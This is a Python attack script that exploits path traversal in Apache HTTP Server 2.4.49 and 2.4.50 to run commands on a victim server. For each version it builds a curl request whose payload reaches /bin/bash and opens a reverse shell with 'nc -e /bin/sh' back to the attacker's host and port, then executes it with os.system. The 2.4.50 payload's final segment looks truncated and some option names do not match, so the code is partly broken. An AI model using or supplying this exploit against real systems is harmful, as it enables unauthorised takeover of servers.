import sys, getopt, os

parameter_list = sys.argv[1:]
options = "hi:p:v:q:w:"
long_options = ["Help", "Host IP", "Host Port", "Victim IP", "Victim Port", "Version"]

ip_host = ''
port_host = ''
ip_victim = ''
port_victim = ''
version = ''

try:
    opts, args = getopt.getopt(parameter_list, options, long_options)
except getopt.GetoptError:
    print ("Follow instructions below: ")
    print ('linearg.py -i <ip_host> -p <port_host> -v <ip_victim> -q <port_victim> -w <version>') 
    sys.exit(5)
for opt, arg in opts:
    if opt == '-h':
        print ('linearg.py -i <ip_host> -p <port_host> -v <ip_victim> -q <port_victim> -w <version>') 
        sys.exit()
    elif opt in ("-i", "--iphost"):
        ip_host = arg
    elif opt in ("-p", "--porthost"):
        port_host = arg
    elif opt in ("-v", "--ipvictim"):
        ip_victim = arg
    elif opt in ("-q", "--portvictim"):
        port_victim = arg
    elif opt in ("-w", "--vers"):
        version = arg

print ('Host IP: ', ip_host)
print ('Host Port: ', port_host)
print ('Victim IP: ', ip_victim)
print ('Victim Port: ', port_victim)
print ('OS Version: ', version)

if (version == "2.4.49"):
    print("Building RCE exploit for Apache Version 2.4.49")
    cmd = "curl -v 'http://{}:{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; nc -e /bin/sh {} {}'".format(
        ip_victim, port_victim, ip_host, port_host)

# 2.4.50
if (version == "2.4.50"):
    print("Building RCE exploit for Apache Version 2.4.50")
    cmd = "curl -v 'http://{}:{}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%6/bin/bash' -d 'echo Content-Type: text/plain; echo; nc -e /bin/sh {} {}'".format(
        ip_victim, port_victim, ip_host, port_host)

os.system(cmd)
print("Successfully exploited, please check your listener for shell")